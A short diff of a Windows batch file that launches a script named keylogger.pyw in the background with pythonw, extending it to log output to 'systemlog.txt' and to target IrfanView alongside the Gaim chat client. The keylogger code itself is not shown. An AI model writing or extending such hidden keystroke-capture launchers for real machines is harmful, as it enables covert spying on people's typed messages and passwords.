@@ -32,4 +32,4 @@
 
 @echo off
 
-start c:\Python24\pythonw.exe keylogger.pyw -n "C:\Program Files\Gaim\gaim.exe"
+start c:\Python24\pythonw.exe keylogger.pyw -n "C:\Program Files\Gaim\gaim.exe" -s "systemlog.txt" -n "C:\Program Files\IrfanView\i_view32.exe"
